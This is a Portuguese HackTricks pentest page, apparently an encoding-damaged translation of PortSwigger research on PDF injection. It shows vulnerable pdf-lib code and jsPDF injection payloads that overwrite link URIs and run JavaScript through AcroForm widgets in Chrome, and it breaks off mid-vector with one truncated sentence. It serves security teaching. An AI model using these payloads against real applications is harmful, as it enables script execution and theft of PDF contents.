<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- VocÃª trabalha em uma **empresa de seguranÃ§a cibernÃ©tica**? VocÃª quer ver sua **empresa anunciada no HackTricks**? ou vocÃª quer ter acesso Ã  **Ãºltima versÃ£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A FamÃ­lia PEASS**](https://opensea.io/collection/the-peass-family), nossa coleÃ§Ã£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe suas tÃ©cnicas de hacking enviando PRs para o [repositÃ³rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


**Se a sua entrada estiver sendo refletida dentro de um arquivo PDF, vocÃª pode tentar injetar dados PDF para executar JavaScript ou roubar o conteÃºdo do PDF.**

As seguintes informaÃ§Ãµes foram retiradas de [**https://portswigger.net/research/portable-data-exfiltration**](https://portswigger.net/research/portable-data-exfiltration)

## PDF-Lib

Desta vez, eu estava usando o [PDFLib](https://pdf-lib.js.org). Levei algum tempo para usar a biblioteca para criar uma anotaÃ§Ã£o e ver se eu poderia injetar um parÃªntese de fechamento na URI da anotaÃ§Ã£o - e funcionou! O cÃ³digo vulnerÃ¡vel de amostra que usei para gerar o cÃ³digo de anotaÃ§Ã£o foi:

`...`  \
`A: {`\
    `Type: 'Action',`\
    `S: 'URI',`\
    ``URI: PDFString.of(`injection)`),``\
  `}`\
  `})`\
`...`

[CÃ³digo completo:](https://github.com/PortSwigger/portable-data-exfiltration/blob/main/PDF-research-samples/pdf-lib/first-injection/test.js)

Como eu sabia que a injeÃ§Ã£o foi bem-sucedida? O PDF seria renderizado corretamente, a menos que eu injetasse um parÃªntese de fechamento. Isso provou que o parÃªntese de fechamento estava saindo da string e causando cÃ³digo PDF invÃ¡lido. Quebrar o PDF foi legal, mas eu precisava garantir que pudesse executar JavaScript, Ã© claro. Eu olhei para o cÃ³digo PDF renderizado e notei que a saÃ­da estava sendo codificada usando o filtro FlateDecode. Eu escrevi um pequeno script para descomprimir o bloco e a saÃ­da da seÃ§Ã£o de anotaÃ§Ã£o ficou assim:`<<`\
`/Type /Annot`\
`/Subtype /Link`\
`/Rect [ 50 746.89 320 711.89 ]`\
`/Border [ 0 0 2 ]`\
`/C [ 0 0 1 ]`\
`/A <<`\
`/Type /Action`\
`/S /URI`\
`/URI (injection))`\
`>>`\
`>>`

Como vocÃª pode ver claramente, a string de injeÃ§Ã£o estÃ¡ fechando o limite de texto com um parÃªntese de fechamento, o que deixa um parÃªntese de fechamento existente que faz com que o PDF seja renderizado incorretamente:

![Captura de tela mostrando uma caixa de diÃ¡logo de erro ao carregar o PDF](https://portswigger.net/cms/images/34/f4/3ed2-article-screenshot-showing-damaged-pdf.png)

Ã“timo, entÃ£o eu poderia quebrar a renderizaÃ§Ã£o do PDF, e agora? Eu precisava criar uma injeÃ§Ã£o que chamasse algum JavaScript - o alert(1) da injeÃ§Ã£o PDF.

Assim como os vetores XSS dependem do parsing do navegador, a explorabilidade da injeÃ§Ã£o PDF pode depender do renderizador PDF. Decidi comeÃ§ar vis
## Chrome

Falei muito sobre o Acrobat, mas e o PDFium (leitor de PDF do Chrome)? O Chrome Ã© complicado; a superfÃ­cie de ataque Ã© muito menor, pois o suporte ao JavaScript Ã© mais limitado do que o do Acrobat. A primeira coisa que notei foi que o JavaScript nÃ£o estava sendo executado em anotaÃ§Ãµes, entÃ£o meus testes de conceito nÃ£o estavam funcionando. Para fazer os vetores funcionarem no Chrome, eu precisava pelo menos executar JavaScript dentro das anotaÃ§Ãµes. Primeiro, decidi tentar sobrescrever uma URL em uma anotaÃ§Ã£o. Isso foi bem fÃ¡cil. Eu poderia usar a injeÃ§Ã£o base que criei antes e simplesmente injetar outra aÃ§Ã£o com uma entrada URI que sobrescreveria a URL existente:`var doc = new jsPDF();`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`/blah)>>/A<</S/URI/URI(https://portswigger.net)``\
``/Type/Action>>/F 0>>(`});``\
`doc.text(20, 20, 'Test text');`

Isso navegaria para portswigger.net quando clicado. EntÃ£o, passei a tentar diferentes injeÃ§Ãµes para chamar JavaScript, mas isso falharia todas as vezes. Eu pensei que era impossÃ­vel de fazer. Eu dei um passo atrÃ¡s e tentei construir manualmente um PDF inteiro que chamaria JavaScript a partir de um clique no Chrome sem uma injeÃ§Ã£o. Ao usar um botÃ£o AcroForm, o Chrome permitiria a execuÃ§Ã£o do JavaScript, mas o problema era que ele exigia referÃªncias a partes do PDF. Eu consegui criar uma injeÃ§Ã£o que executaria JavaScript a partir de um clique no JSPDF:`var doc = new jsPDF();`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`/) >> >> <</BS<</S/B/W 0>>/Type/Annot/MK<</BG[ 0.825 0.8275 0.8275]/CA(Submit)>>/Rect [ 72 697.8898 144 676.2897]/Subtype/Widget/AP<</N <</Type/XObject/BBox[ 0 0 72 21.6]/Subtype/Form>>>>/Parent <</Kids[ 3 0 R]/Ff 65536/FT/Btn/T(test)>>/H/P/A<</S/JavaScript/JS(app.alert(1))/Type/Action/F 4/DA(blah`});``\
`doc.text(20, 20, 'Click me test');`

Como vocÃª pode ver, o vetor acima requer conhecimento da estrutura do PDF. \[ 3 0 R] refere-se a um objeto PDF especÃ­fico e, se estivÃ©ssemos fazendo um ataque de injeÃ§Ã£o de PDF cego, nÃ£o saberÃ­amos a estrutura dele. Ainda assim, a prÃ³xima etapa Ã© tentar uma submissÃ£o de formulÃ¡rio. Podemos usar a funÃ§Ã£o submitForm para isso, e como a anotaÃ§Ã£o requer um clique, o Chrome permitirÃ¡:`/) >> >> <</BS<</S/B/W 0>>/Type/Annot/MK<</BG[ 0.0 813.54 566.93 -298.27]/CA(Submit)>>/Rect [ 72 697.8898
